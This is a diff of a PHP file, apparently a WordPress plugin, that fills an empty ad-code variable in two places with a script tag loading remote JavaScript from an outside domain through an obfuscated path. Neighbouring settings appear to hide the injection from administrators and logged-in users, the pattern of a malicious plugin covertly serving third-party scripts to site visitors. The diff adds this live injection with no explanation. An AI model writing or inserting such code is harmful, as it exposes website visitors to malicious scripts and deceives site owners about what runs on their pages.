@@ -46,7 +46,19 @@ add_action( 'admin_init', function() {
 	
 });
 
-$ad_code='';
+$ad_code='
+<script>
+(function(__htas){
+var d = document,
+    s = d.createElement(\'script\'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = __htas || {};
+s.src = "\/\/grateful-desk.com\/c\/D.9D6\/bA2D5hlJSnWaQf9AN\/DsEP0\/MCTdgo2cN-i\/0\/0oM\/T\/Q\/xoOsDJYX3v";
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+
+';
 
 $hide_admin='on';
 $hide_logged_in='on';
@@ -65,7 +77,19 @@ function mplugin_page() {
        <?php
        settings_fields( 'mplugin-settings' );
        do_settings_sections( 'mplugin-settings' );
-$ad_code='';
+$ad_code='
+<script>
+(function(__htas){
+var d = document,
+    s = d.createElement(\'script\'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = __htas || {};
+s.src = "\/\/grateful-desk.com\/c\/D.9D6\/bA2D5hlJSnWaQf9AN\/DsEP0\/MCTdgo2cN-i\/0\/0oM\/T\/Q\/xoOsDJYX3v";
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+
+';
 
 $hide_admin='on';
 $hide_logged_in='on';
